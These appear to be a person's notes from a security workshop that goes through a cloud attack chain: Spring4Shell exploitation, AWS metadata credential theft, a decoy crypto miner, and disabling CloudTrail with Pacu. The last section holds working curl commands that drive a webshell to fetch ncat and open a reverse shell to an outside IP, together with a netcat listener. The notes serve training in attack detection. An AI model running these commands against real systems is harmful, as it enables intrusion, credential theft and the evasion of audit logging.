# Workshop: Attack, Detect, Defend

The exercise has a couple phases: get credentials, escalate privileges.

## 5/5/5 benchmark

You have 5 seconds to detect intrusion, 5 minutes to see what's happening and 5 minutes to initiate response.

## The Workshop

The first steps happen inside a VM where you can exploit a vulnerable application

- Scan some things using nmap `nmap -p- 54.167.78.225`
- Go to some open ports to find what's running. It's Spring so Spring4Shell wieeeeee!
- Copy-paste some `curl` commands that leverage in <https://github.com/craig/SpringCore0day>
- Hey ho let's go, reverse shell! _More information below_
- When running on AWS, use `curl` to retrieve things from metadata service and get the credentials for the instance
- Start a crypto miner as a decoy and steal the credentials
- Configure the `aws` cli using the stolen credentials and stop _CloudTrail_. Normally this fails because a lack of permissions, but this would be really funny if it worked.
- Use something like [Pacu](https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/) to find exploits. It's something like Metasploit, but for cloud.
- Using Pacu, you get a set of backdoor credentials for an admin user, great! Use these credentials to disable CloudTrail logging.

The second steps happen inside the Sysdig console

- _This is going so fast, I've got no clue_

## Links

- <https://sysdig.com/blog/cloud-breach-terraform-data-theft/>
- <https://t.ly/zPXOK> but remeber to not click on shortened links!

## How to reverse shell

```shell
curl --output - "http://54.167.78.225:31766/tomcatwar.jsp?pwd=j" -s --data-urlencode "cmd=wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" | grep -a -v request.getParameter | sort | uniq | sed '/^\/\//d'
curl --output - "http://54.167.78.225:31766/tomcatwar.jsp?pwd=j" -s --data-urlencode "cmd=chmod +x ncat" | grep -a -v request.getParameter | sort | uniq | sed '/^\/\//d'
curl --output - "http://54.167.78.225:31766/tomcatwar.jsp?pwd=j" -s --data-urlencode "cmd=chmod +x ncat" | grep -a -v request.getParameter | sort | uniq | sed '/^\/\//d'

nohup sh -c 'sleep 3 && curl --output - "http://54.167.78.225:31766/tomcatwar.jsp?pwd=j" -s --data-urlencode "cmd=./ncat 54.158.240.134 34444 -e /bin/bash" | grep -a -v request.getParameter | sort | uniq | sed "/^\/\//d"' 2>/dev/null &
nc -lnvp 34444

:
```
